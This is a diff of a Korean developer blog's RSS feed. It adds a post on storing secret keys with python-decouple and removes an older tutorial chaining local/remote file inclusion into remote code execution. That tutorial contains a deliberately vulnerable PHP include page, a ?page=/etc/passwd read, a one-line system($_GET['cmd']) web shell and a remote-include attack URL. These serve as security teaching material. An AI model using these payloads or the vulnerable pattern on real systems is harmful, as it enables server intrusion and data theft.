@@ -9,8 +9,38 @@
     <atom:link href="https://blog.jhyeon.dev/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>JHYEON BLOG</description>
-    <pubDate>Sun, 02 May 2021 15:00:00 GMT</pubDate>
+    <pubDate>Wed, 05 May 2021 01:00:00 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>Python 환경에서 웹 서비스 운영할 때 비밀키 관리방법(python-decouple)</title>
+      <link>https://blog.jhyeon.dev/2021/05/05/python-decouple-210505/</link>
+      <guid>https://blog.jhyeon.dev/2021/05/05/python-decouple-210505/</guid>
+      <pubDate>Wed, 05 May 2021 01:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;요즘 Python Web Framework(Flask, Django) 실제 웹을 운영할 때도 생각보다 괜</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>요즘 Python Web Framework(Flask, Django) 실제 웹을 운영할 때도 생각보다 괜찮게 잘 되있어서</p><p>실 서비스에도 많이 사용하게 되는 것을 여기저기서 많이 봤다.</p><p>다만 개발할 떄 비밀키라던가 API KEY 등을 코드에 하드코딩을 하면 취약점이 발생했을 때 이러한 키들이</p><p>유출 당할 수 있는 문제점이 있는데 그러한 문제를 막고자 파이썬에서는 <code>decouple</code> 모듈이 있다.</p><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><pre><code class="bash">pip3 install python-decouple</code></pre><h3 id="Apply"><a href="#Apply" class="headerlink" title="Apply"></a>Apply</h3><p><code>settings.ini</code></p><pre><code>[settings]TESTKEY=this_is_test_key</code></pre><p><code>main.py</code></p><pre><code class="py">#!/usr/bin/python3from decouple import configtest_api_key = config(&quot;TESTKEY&quot;)print(test_api_key)</code></pre><p>여기서 주의할 점은 settings.ini는 main.py 위치에 존재해야 하며,</p><p>git으로 관리시에는 반드시 <code>.gitignore</code> 를 통해서 git에 push 되지 않도록 해야한다.</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://pypi.org/project/python-decouple/">https://pypi.org/project/python-decouple/</a></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Development/">Development</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/Python/">Python</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Decouple/">Decouple</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/SECRET-KEY/">SECRET_KEY</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/05/05/python-decouple-210505/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>Android 7.0 이상의 환경에서 CA 인증서 설치</title>
@@ -663,36 +693,6 @@
       
       
       <comments>https://blog.jhyeon.dev/2021/01/31/android-rootkit-210131/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>LFI를 활용한 RCE 연계하기</title>
-      <link>https://blog.jhyeon.dev/2021/01/23/lfi-to-rce-210123/</link>
-      <guid>https://blog.jhyeon.dev/2021/01/23/lfi-to-rce-210123/</guid>
-      <pubDate>Fri, 22 Jan 2021 15:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;DVWA 리뷰를 할 때 LFI 공격에 관해서 잠깐 다뤄보았을 때 LFI를 활용해 어떤 추가 공격이 나올 </description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>DVWA 리뷰를 할 때 LFI 공격에 관해서 잠깐 다뤄보았을 때 LFI를 활용해 어떤 추가 공격이 나올 수 있는지 작성하기로 했었다.</p><p>이번 글에서는 RCE(Remote Code Execution)을 연계하는 방법에 대해서 적어볼 것이다.</p><h3 id="LFI-amp-RFI-개념"><a href="#LFI-amp-RFI-개념" class="headerlink" title="LFI &amp; RFI 개념"></a>LFI &amp; RFI 개념</h3><p>LFI(Local File Inclusion) 취약점은 <code> 내부 서버 </code> 파일을 읽어올 수 있는 취약점입니다.<br>RFI(Remote File Inclusion) 취약점은 <code> 외부 서버 </code> 로 부터의 파일을 읽어올 수 있는 취약점입니다.</p><p>즉, 내부에서 불러오는 것과 외부에서 불러온다는 점에서 약간의 차이가 있지만 두 취약점의 역할은 동일합니다.</p><h3 id="테스트-1-LFI-환경-만들기"><a href="#테스트-1-LFI-환경-만들기" class="headerlink" title="테스트(1) LFI 환경 만들기"></a>테스트(1) LFI 환경 만들기</h3><p>우선 LFI를 테스트해볼 환경을 간단하게만 만들어보겠습니다.</p><p><code> test.php(테스트 페이지) </code></p><pre><code class="php">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;ko&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt; test page &lt;/title&gt;&lt;/head&gt;&lt;body&gt;get&lt;?php include($_GET[&#39;page&#39;]);?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>코드에는 LFI 취약점을 발생시키기 위한 include 함수만을 사용하였고, 나머지는 표준 html 작성 방식입니다.</p><p>이제 해당 코드에서 page 인자를 통한 내부 파일을 로드시켜보겠습니다.</p><p><code> ?page=/etc/passwd </code></p><img src="/img/post/lfi_to_rce/lfi.png" class="lazyload" data-srcset="/img/post/lfi_to_rce/lfi.png" srcset="data:image/png;base64,666"><p>서버 내부의 /etc/passwd 파일을 정상적으로 읽어오면서 화면에 출력이 가능하게 됩니다.</p><p>이런 공격을 바로 LFI 취약점이라고 할 수 있고 여기서 조금 더 연계해서 RCE까지 가봅시다.</p><h3 id="테스트-2-LFI-amp-RCE"><a href="#테스트-2-LFI-amp-RCE" class="headerlink" title="테스트(2) LFI &amp; RCE"></a>테스트(2) LFI &amp; RCE</h3><p>우선 Remote(외부) 환경의 파일을 로드하기 위해 설정 해야 할 옵션들이 있습니다.</p><blockquote><p>(php.ini)</p></blockquote><ol><li>allow_url_include = On</li></ol><p>웹을 실제로 운영할 때는 이런 옵션 하나하나 숙지하시고 관리를 잘 해주셔야 하고 평상시에는 On으로 두시면 안됩니다.</p><p>이후, 아래 웹 쉘을 실행시키는 페이로드를 간단하게 짜서 페이지에 로드시켜보겠습니다.</p><p><code> payload.php </code></p><pre><code class="php">&lt;?phpsystem($_GET[&#39;cmd&#39;]);?&gt;</code></pre><p>그러면, test.php(메인 테스트 페이지)에서 해당 파일을 어떻게 불러올 수 있을까요.</p><p><code> ?page=http://~~/payload.php?cmd=pwd </code></p><p>이런 공격 URL이 나오게 되겠죠.</p><p>payload.php를 불러와서 현재 페이지에 로드시켜보면 다음과 같이 웹 쉘을 작동시킬 수 있습니다.</p><img src="/img/post/lfi_to_rce/payresult.png" class="lazyload" data-srcset="/img/post/lfi_to_rce/payresult.png" srcset="data:image/png;base64,666">]]></content:encoded>
-      
-      
-      <category domain="https://blog.jhyeon.dev/categories/Web/">Web</category>
-      
-      
-      <category domain="https://blog.jhyeon.dev/tags/RCE/">RCE</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/LFI/">LFI</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/Pentesting/">Pentesting</category>
-      
-      
-      <comments>https://blog.jhyeon.dev/2021/01/23/lfi-to-rce-210123/#disqus_thread</comments>
       
     </item>
     
